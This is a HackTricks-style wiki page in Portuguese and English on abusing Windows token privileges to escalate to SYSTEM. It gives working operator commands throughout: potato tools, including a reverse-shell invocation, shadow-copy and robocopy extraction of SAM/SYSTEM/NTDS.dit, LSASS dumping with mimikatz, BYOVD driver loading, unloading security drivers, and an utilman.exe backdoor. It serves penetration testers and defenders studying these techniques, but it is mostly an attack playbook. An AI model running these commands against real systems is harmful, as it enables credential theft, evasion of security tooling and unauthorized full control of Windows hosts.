# Abusing Tokens

{{#include ../../banners/hacktricks-training.md}}

## Tokens

Se você **não sabe o que são Windows Access Tokens** leia esta página antes de continuar:


{{#ref}}
access-tokens.md
{{#endref}}

**Talvez você consiga escalar privilégios abusando dos tokens que você já tem**

### SeImpersonatePrivilege

Esta é uma privilege mantida por qualquer process que permite a impersonation (mas não a criação) de qualquer token, desde que um handle para ele possa ser obtido. Um token privilegiado pode ser adquirido de um Windows service (DCOM) ao induzi-lo a realizar autenticação NTLM contra um exploit, habilitando subsequentemente a execução de um process com privilégios SYSTEM. Essa vulnerability pode ser explorada usando várias tools, como [juicy-potato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (que requer que winrm esteja disabled), [SweetPotato](https://github.com/CCob/SweetPotato) e [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).

Notas modernas do operator:

- **JuicyPotato is legacy**: no Windows 10 1809+/Server 2019+, prefira **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato** ou **PrintSpoofer** dependendo de qual superfície RPC/COM ainda está acessível.
- Se você comprometeu um service rodando como **`LOCAL SERVICE`** ou **`NETWORK SERVICE`** e `whoami /priv` mostra um **filtered token** sem **SeImpersonatePrivilege**/**SeAssignPrimaryTokenPrivilege**, recupere primeiro o **default privilege set** da conta (por exemplo com **FullPowers**) e depois tente novamente a família potato.
- Alguns forks mais novos são mais amigáveis para o operator do que as tools originais. Por exemplo, **SigmaPotato** adiciona reflexão/execução in-memory e compatibilidade moderna com Windows, enquanto **PrintNotifyPotato** abusa do serviço COM PrintNotify e frequentemente é útil quando o caminho clássico do Spooler está disabled.
```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

É muito semelhante a **SeImpersonatePrivilege**, ele usará o **mesmo método** para obter um token privilegiado.\
Então, esse privilégio permite **atribuir um token primário** a um novo/processo suspenso. Com o token de impersonation privilegiado, você pode derivar um token primário (DuplicateTokenEx).\
Com o token, você pode criar um **novo processo** com 'CreateProcessAsUser' ou criar um processo suspenso e **definir o token** (em geral, você não pode modificar o token primário de um processo em execução).

### SeTcbPrivilege

Se você tiver habilitado esse token, pode usar **KERB_S4U_LOGON** para obter um **token de impersonation** para qualquer outro usuário sem conhecer as credenciais, **adicionar um grupo arbitrário** (admins) ao token, definir o **nível de integridade** do token para "**medium**", e atribuir esse token à **thread atual** (SetThreadToken).

### SeBackupPrivilege

O sistema é forçado a **conceder todo o acesso de leitura** a qualquer arquivo (limitado a operações de leitura) por esse privilégio. Ele é utilizado para **ler os hashes de senha da conta Administrator local** no registry, após o que ferramentas como "**psexec**" ou "**wmiexec**" podem ser usadas com o hash (técnica Pass-the-Hash). No entanto, essa técnica falha em duas condições: quando a conta Local Administrator está desabilitada, ou quando há uma policy em vigor que remove os direitos administrativos dos Local Administrators que se conectam remotamente.\
Na prática, o fluxo built-in mais confiável geralmente é **VSS + `robocopy /b`**: crie/exponha uma cópia shadow, depois copie `SAM`/`SYSTEM` ou `NTDS.dit` em **backup mode**, o que contorna as ACLs do arquivo.
```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```
You can **abuse this privilege** with:

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- following **IppSec** in [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec)
- Or as explained in the **escalating privileges with Backup Operators** section of:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

A permissão de **write access** para qualquer arquivo do sistema, independentemente da **Access Control List (ACL)** do arquivo, é fornecida por este privilégio. Ele abre inúmeras possibilidades de escalation, incluindo a capacidade de **modify services**, realizar DLL Hijacking e definir **debuggers** via Image File Execution Options, entre várias outras técnicas.

### SeCreateTokenPrivilege

SeCreateTokenPrivilege é uma permissão poderosa, especialmente útil quando um usuário possui a capacidade de impersonate tokens, mas também na ausência de SeImpersonatePrivilege. Essa capacidade depende da habilidade de impersonar um token que represente o mesmo usuário e cujo integrity level não exceda o do processo atual.

**Key Points:**

- **Impersonation without SeImpersonatePrivilege:** É possível aproveitar SeCreateTokenPrivilege para EoP impersonando tokens sob condições específicas.
- **Conditions for Token Impersonation:** A impersonation bem-sucedida exige que o token alvo pertença ao mesmo usuário e tenha um integrity level menor ou igual ao integrity level do processo que tenta a impersonation.
- **Creation and Modification of Impersonation Tokens:** Os usuários podem criar um impersonation token e aprimorá-lo adicionando o SID (Security Identifier) de um grupo privilegiado.

### SeLoadDriverPrivilege

Este privilégio permite **load and unload device drivers** com a criação de uma entrada de registry com valores específicos para `ImagePath` e `Type`. Como o acesso de escrita direto a `HKLM` (HKEY_LOCAL_MACHINE) é restrito, `HKCU` (HKEY_CURRENT_USER) deve ser usado em vez disso. No entanto, para tornar `HKCU` reconhecível pelo kernel para a configuração do driver, um caminho específico deve ser seguido.

O uso ofensivo moderno geralmente é **BYOVD** (bring your own vulnerable driver): carregar um kernel driver **assinado mas vulnerable** e então usar seus IOCTLs para desabilitar proteções ou chegar à execução de código no kernel. Lembre-se de que, em builds recentes do Windows 11/Server, a **Microsoft vulnerable driver blocklist** e/ou **HVCI/Memory Integrity** frequentemente quebram cadeias públicas antigas, então os exemplos clássicos no estilo `szkg64.sys` já não são universalmente confiáveis.

Este caminho é `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, onde `<RID>` é o Relative Identifier do usuário atual. Dentro de `HKCU`, todo esse caminho deve ser criado, e dois valores precisam ser definidos:

- `ImagePath`, que é o caminho para o binary a ser executado
- `Type`, com um valor de `SERVICE_KERNEL_DRIVER` (`0x00000001`).

**Steps to Follow:**

1. Acesse `HKCU` em vez de `HKLM` devido ao acesso de escrita restrito.
2. Crie o caminho `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` dentro de `HKCU`, onde `<RID>` representa o Relative Identifier do usuário atual.
3. Defina `ImagePath` para o caminho de execução do binary.
4. Atribua `Type` como `SERVICE_KERNEL_DRIVER` (`0x00000001`).
```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```
Mais maneiras de abusar desse privilégio em [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

Isso é semelhante a **SeRestorePrivilege**. Sua função principal permite que um processo **assuma a propriedade de um objeto**, contornando a exigência de acesso discricionário explícito por meio da concessão de direitos de acesso WRITE_OWNER. O processo envolve primeiro garantir a propriedade da chave de registro pretendida para fins de escrita e, em seguida, alterar a DACL para habilitar operações de escrita.
```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```
### SeDebugPrivilege

Este privilégio permite **depurar outros processos**, incluindo ler e escrever na memória. Diversas estratégias de memory injection, capazes de evadir a maioria das soluções de antivirus e host intrusion prevention, podem ser empregadas com este privilégio.

Em Windows modernos, lembre-se de que `SeDebugPrivilege` normalmente é suficiente para abrir **processos SYSTEM não protegidos** e duplicar seus tokens, mas **não** garante que você consiga acessar o **LSASS**. Se **RunAsPPL / LSA Protection** estiver habilitado, processos não protegidos não podem ler nem injetar no LSASS mesmo que `SeDebugPrivilege` esteja presente. Nesse caso, roube um token de outro processo SYSTEM não-PPL, ou encadeie com um PPL bypass/BYOVD em vez de assumir que `procdump` vai funcionar. Para um exemplo completo de cópia de token usando `SeDebugPrivilege` + `SeImpersonatePrivilege`, veja [this page](sedebug-+-seimpersonate-copy-token.md).

#### Dump memory

Você pode usar [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) do [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) para **capturar a memória de um processo**. Especificamente, isso pode ser aplicado ao processo **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)**, que é responsável por armazenar as credenciais do usuário depois que ele faz login com sucesso em um sistema.

Você pode então carregar este dump no mimikatz para obter passwords:
```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```
#### RCE

Se você quiser obter um shell `NT SYSTEM`, você pode usar:

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)
```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```
### SeManageVolumePrivilege

Este direito (Perform volume maintenance tasks) permite abrir handles de dispositivo de volume bruto (por exemplo, \\.\C:) para I/O direto de disco que contorna ACLs do NTFS. Com ele, você pode copiar bytes de qualquer arquivo no volume lendo os blocos subjacentes, permitindo leitura arbitrária de arquivos de material sensível (por exemplo, chaves privadas da máquina em %ProgramData%\Microsoft\Crypto\, hives do registry, SAM/NTDS via VSS). Isso é especialmente impactante em servidores CA, onde exfiltrar a chave privada da CA permite forjar um Golden Certificate para se passar por qualquer principal.

Veja técnicas detalhadas e mitigations:

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{endref}}

## Check privileges
```
whoami /priv
```
Os **tokens que aparecem como Disabled** geralmente podem ser habilitados, então você pode frequentemente abusar de privilégios _Enabled_ e _Disabled_.

### Enable All the tokens

Se você tiver privilégios desabilitados, pode usar o script [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) para habilitar todos os tokens:
```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```
Ou o **script** incorporado neste [**post**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/).

## Table

Planilha completa de privilégios de token em [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin), o resumo abaixo lista apenas formas diretas de explorar o privilégio para obter uma sessão admin ou ler arquivos sensíveis.

| Privilege                  | Impact      | Tool                    | Execution path                                                                                                                                                                                                                                                                                                                                     | Remarks                                                                                                                                                                                                                                                                                                                        |
| ------------------------ | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Admin**_ | 3rd party tool          | _"Ele permitiria que um usuário impersonate tokens e privesc para nt system usando ferramentas como potato.exe, rottenpotato.exe e juicypotato.exe"_                                                                                                                                                                                                      | Obrigado [Aurélien Chalot](https://twitter.com/Defte_) pela atualização. Vou tentar reescrever isso em um formato mais parecido com uma receita em breve.                                                                                                                                                                                         |
| **`SeBackup`**             | **Threat**  | _**Built-in commands**_ | Ler arquivos sensíveis com `robocopy /b` ou helpers dedicados compatíveis com SeBackup.                                                                                                                                                                                                                                                                 | <p>- Ótimo para `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit`, e às vezes `%WINDIR%\MEMORY.DMP`.<br><br>- `robocopy` é conveniente, mas cmdlets/APIs dedicados ao SeBackup costumam ser mais flexíveis para arquivos bloqueados/abertos.</p>                                                                                                   |
| **`SeCreateToken`**        | _**Admin**_ | 3rd party tool          | Criar um token arbitrário incluindo local admin rights com `NtCreateToken`.                                                                                                                                                                                                                                                                          |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | Duplicar um token SYSTEM **não-PPL** ou despejar memória de um processo não protegido.                                                                                                                                                                                                                                                                 | <p>O dumping do LSASS geralmente é bloqueado se RunAsPPL/LSA Protection estiver habilitado.</p><p>Script pode ser encontrado em [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)</p>                                                                                                               |
| **`SeImpersonate`**        | _**Admin**_ | 3rd party tool          | Usar a **família Potato** / impersonation de named-pipe para iniciar SYSTEM (`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato`, etc.).                                                                                                                                                                                    | <p>Mais prático a partir de service accounts como IIS APPPOOL, MSSQL, scheduled tasks, ou qualquer contexto que já possua `SeImpersonatePrivilege`.</p>                                                                                                                                                                            |
| **`SeLoadDriver`**         | _**Admin**_ | 3rd party tool          | <p>1. Carregar um kernel driver assinado, mas vulnerável (BYOVD)<br>2. Usar os IOCTLs do driver para obter kernel R/W, desativar tooling de segurança, ou elevar para SYSTEM<br><br>Alternativamente, o privilégio pode ser usado para descarregar drivers relacionados à segurança com o comando builtin <code>fltMC</code>, i.e. <code>fltMC sysmondrv</code></p>                     | <p>Drivers públicos antigos como <code>szkg64.sys</code> estão cada vez mais bloqueados em Windows moderno pela vulnerable-driver blocklist / HVCI.</p>                                                                                                                                                                               |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. Iniciar PowerShell/ISE com o privilégio SeRestore presente.<br>2. Habilitar o privilégio com <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>).<br>3. Renomear utilman.exe para utilman.old<br>4. Renomear cmd.exe para utilman.exe<br>5. Bloquear o console e pressionar Win+U</p> | <p>O ataque pode ser detectado por alguns softwares AV.</p><p>O método alternativo depende de substituir binários de serviços armazenados em "Program Files" usando o mesmo privilégio</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**Admin**_ | _**Built-in commands**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. Renomear cmd.exe para utilman.exe<br>4. Bloquear o console e pressionar Win+U</p>                                                                                                                                       | <p>O ataque pode ser detectado por alguns softwares AV.</p><p>O método alternativo depende de substituir binários de serviços armazenados em "Program Files" usando o mesmo privilégio.</p>                                                                                                                                                           |
| **`SeTcb`**                | _**Admin**_ | 3rd party tool          | <p>Manipular tokens para incluir local admin rights. Pode exigir SeImpersonate.</p><p>A verificar.</p>                                                                                                                                                                                                                                     |                                                                                                                                                                                                                                                                                                                                |

## References

- Dê uma olhada nesta tabela definindo Windows tokens: [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin)
- Dê uma olhada neste [**paper**](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt) sobre privesc com tokens.
- itm4n – Give Me Back My Privileges! Please? (restricted service tokens / FullPowers): https://itm4n.github.io/localservice-privileges/
- Microsoft – Robocopy (`/b` backup mode bypasses file/folder ACL checks): https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy
- Microsoft – Perform volume maintenance tasks (SeManageVolumePrivilege): https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks
- 0xdf – HTB: Certificate (SeManageVolumePrivilege → CA key exfil → Golden Certificate): https://0xdf.gitlab.io/2025/10/04/htb-certificate.html

{{#include ../../banners/hacktricks-training.md}}
